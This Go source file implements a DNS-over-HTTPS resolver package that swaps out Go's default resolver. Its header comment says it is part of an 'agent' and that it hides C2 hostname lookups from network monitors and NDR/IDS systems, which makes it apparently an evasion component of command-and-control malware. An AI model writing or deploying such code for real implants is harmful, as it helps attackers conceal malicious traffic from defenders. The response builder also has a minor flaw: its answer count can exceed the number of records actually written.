// Package doh provides a DNS-over-HTTPS resolver that can replace Go's default
// DNS resolver. When enabled via build parameter, all agent DNS resolution
// (including C2 hostname lookups) goes through encrypted HTTPS to a DoH provider,
// making DNS queries invisible to network monitors and NDR/IDS systems.
package doh

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Providers maps well-known DoH provider names to their HTTPS endpoints.
var Providers = map[string]string{
	"cloudflare": "https://cloudflare-dns.com/dns-query",
	"google":     "https://dns.google/resolve",
	"quad9":      "https://dns.quad9.net:5053/dns-query",
}

// dohResponse represents the JSON DNS response format.
type dohResponse struct {
	Status   int         `json:"Status"`
	Answer   []dohAnswer `json:"Answer"`
}

type dohAnswer struct {
	Name string `json:"name"`
	Type int    `json:"type"`
	TTL  int    `json:"TTL"`
	Data string `json:"data"`
}

// Note: Go's net.Resolver requires wire-format DNS over the Dial connection.
// SetGlobalResolver creates a pipe-based resolver that translates wire-format
// DNS queries into DoH HTTP requests and returns wire-format responses.

// resolveEndpoint converts a provider name or URL to the full endpoint URL.
func resolveEndpoint(provider string) string {
	if ep, ok := Providers[strings.ToLower(provider)]; ok {
		return ep
	}
	if strings.HasPrefix(provider, "https://") {
		return provider
	}
	return fmt.Sprintf("https://%s/dns-query", provider)
}

// LookupHost performs a DNS A/AAAA lookup via DoH and returns IP addresses.
func LookupHost(ctx context.Context, endpoint, host string) ([]string, error) {
	// Query for A records
	ips, err := queryDoH(ctx, endpoint, host, "A")
	if err != nil {
		return nil, err
	}

	// Also query AAAA
	aaaa, _ := queryDoH(ctx, endpoint, host, "AAAA")
	ips = append(ips, aaaa...)

	if len(ips) == 0 {
		return nil, fmt.Errorf("doh: no records found for %s", host)
	}
	return ips, nil
}

// LookupAddr performs a reverse DNS lookup via DoH.
func LookupAddr(ctx context.Context, endpoint, addr string) ([]string, error) {
	// Construct PTR query from IP address
	ptrName, err := reverseAddr(addr)
	if err != nil {
		return nil, err
	}
	return queryDoH(ctx, endpoint, ptrName, "PTR")
}

// queryDoH performs a single DNS query via DoH JSON API.
func queryDoH(ctx context.Context, endpoint, name, recordType string) ([]string, error) {
	queryURL := fmt.Sprintf("%s?name=%s&type=%s", endpoint,
		url.QueryEscape(name), url.QueryEscape(recordType))

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		},
	}

	req, err := http.NewRequestWithContext(ctx, "GET", queryURL, nil)
	if err != nil {
		return nil, fmt.Errorf("doh: create request: %w", err)
	}
	req.Header.Set("Accept", "application/dns-json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("doh: query failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, fmt.Errorf("doh: read response: %w", err)
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("doh: HTTP %d: %s", resp.StatusCode, string(body))
	}

	var dohResp dohResponse
	if err := json.Unmarshal(body, &dohResp); err != nil {
		return nil, fmt.Errorf("doh: parse response: %w", err)
	}

	if dohResp.Status != 0 {
		return nil, fmt.Errorf("doh: DNS error status %d", dohResp.Status)
	}

	var results []string
	for _, ans := range dohResp.Answer {
		// Strip trailing dot from PTR records
		data := strings.TrimSuffix(ans.Data, ".")
		results = append(results, data)
	}
	return results, nil
}

// reverseAddr converts an IP address to its reverse DNS PTR format.
func reverseAddr(addr string) (string, error) {
	ip := net.ParseIP(addr)
	if ip == nil {
		return "", fmt.Errorf("invalid IP address: %s", addr)
	}

	if ip4 := ip.To4(); ip4 != nil {
		return fmt.Sprintf("%d.%d.%d.%d.in-addr.arpa",
			ip4[3], ip4[2], ip4[1], ip4[0]), nil
	}

	// IPv6
	ip6 := ip.To16()
	var sb strings.Builder
	for i := len(ip6) - 1; i >= 0; i-- {
		sb.WriteString(fmt.Sprintf("%x.%x.", ip6[i]&0xF, ip6[i]>>4))
	}
	sb.WriteString("ip6.arpa")
	return sb.String(), nil
}

// dohDialer holds the DoH endpoint for the custom resolver integration.
var dohDialer struct {
	enabled  bool
	endpoint string
}

// SetGlobalResolver configures the Go runtime to use DoH for all DNS resolution.
// This affects net.LookupHost, net.LookupAddr, and all HTTP client hostname
// resolution throughout the agent process.
func SetGlobalResolver(provider string) {
	endpoint := resolveEndpoint(provider)
	dohDialer.enabled = true
	dohDialer.endpoint = endpoint

	net.DefaultResolver = &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			// Create a pipe-based connection that translates DNS wire format
			// queries into DoH HTTP queries and returns wire format responses.
			server, client := net.Pipe()
			go handleDNSPipe(ctx, server, endpoint)
			return client, nil
		},
	}
}

// IsEnabled returns whether DoH resolution is active.
func IsEnabled() bool {
	return dohDialer.enabled
}

// Endpoint returns the configured DoH endpoint URL.
func Endpoint() string {
	return dohDialer.endpoint
}

// handleDNSPipe reads DNS wire format queries from the pipe, performs DoH lookups,
// and writes wire format responses back.
func handleDNSPipe(ctx context.Context, conn net.Conn, endpoint string) {
	defer conn.Close()

	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		if n < 12 {
			return // too short for DNS header
		}

		// Parse minimal DNS query: extract the query name and type
		msg := buf[:n]
		txID := uint16(msg[0])<<8 | uint16(msg[1])
		name, qtype, offset := parseDNSQuestion(msg[12:])
		_ = offset

		// Map qtype to string
		typeStr := "A"
		switch qtype {
		case 1:
			typeStr = "A"
		case 28:
			typeStr = "AAAA"
		case 12:
			typeStr = "PTR"
		case 5:
			typeStr = "CNAME"
		case 15:
			typeStr = "MX"
		case 16:
			typeStr = "TXT"
		case 2:
			typeStr = "NS"
		}

		// Perform DoH lookup
		results, _ := queryDoH(ctx, endpoint, name, typeStr)

		// Build DNS wire response
		resp := buildDNSResponse(txID, name, qtype, results)
		conn.Write(resp)
	}
}

// parseDNSQuestion extracts the query name and type from a DNS question section.
func parseDNSQuestion(data []byte) (string, uint16, int) {
	var labels []string
	pos := 0
	for pos < len(data) {
		length := int(data[pos])
		if length == 0 {
			pos++
			break
		}
		if pos+1+length > len(data) {
			break
		}
		labels = append(labels, string(data[pos+1:pos+1+length]))
		pos += 1 + length
	}

	qtype := uint16(0)
	if pos+2 <= len(data) {
		qtype = uint16(data[pos])<<8 | uint16(data[pos+1])
	}

	return strings.Join(labels, "."), qtype, pos + 4 // +4 for qtype + qclass
}

// buildDNSResponse constructs a minimal DNS wire format response.
func buildDNSResponse(txID uint16, name string, qtype uint16, answers []string) []byte {
	// DNS header: 12 bytes
	resp := make([]byte, 12)
	resp[0] = byte(txID >> 8)
	resp[1] = byte(txID)
	resp[2] = 0x81 // QR=1, OPCODE=0, AA=0, TC=0, RD=1
	resp[3] = 0x80 // RA=1, RCODE=0
	resp[4] = 0    // QDCOUNT high
	resp[5] = 1    // QDCOUNT low
	resp[6] = 0    // ANCOUNT high
	resp[7] = byte(len(answers))
	// NSCOUNT and ARCOUNT = 0

	// Question section (echo back the query)
	question := encodeDNSName(name)
	question = append(question, byte(qtype>>8), byte(qtype), 0, 1) // QTYPE + QCLASS=IN
	resp = append(resp, question...)

	// Answer section
	for _, ans := range answers {
		ip := net.ParseIP(ans)
		if ip == nil {
			continue
		}

		// Name pointer to question (offset 12)
		resp = append(resp, 0xc0, 0x0c) // compression pointer

		if ip4 := ip.To4(); ip4 != nil && qtype == 1 {
			resp = append(resp, 0, 1) // TYPE A
			resp = append(resp, 0, 1) // CLASS IN
			resp = append(resp, 0, 0, 0x01, 0x2c) // TTL 300
			resp = append(resp, 0, 4) // RDLENGTH
			resp = append(resp, ip4...) // RDATA
		} else if ip6 := ip.To16(); ip6 != nil && qtype == 28 {
			resp = append(resp, 0, 28) // TYPE AAAA
			resp = append(resp, 0, 1)  // CLASS IN
			resp = append(resp, 0, 0, 0x01, 0x2c) // TTL 300
			resp = append(resp, 0, 16) // RDLENGTH
			resp = append(resp, ip6...) // RDATA
		}
	}

	return resp
}

// encodeDNSName converts a domain name to DNS wire format.
func encodeDNSName(name string) []byte {
	var result []byte
	for _, label := range strings.Split(name, ".") {
		if len(label) == 0 {
			continue
		}
		result = append(result, byte(len(label)))
		result = append(result, []byte(label)...)
	}
	result = append(result, 0) // root label
	return result
}
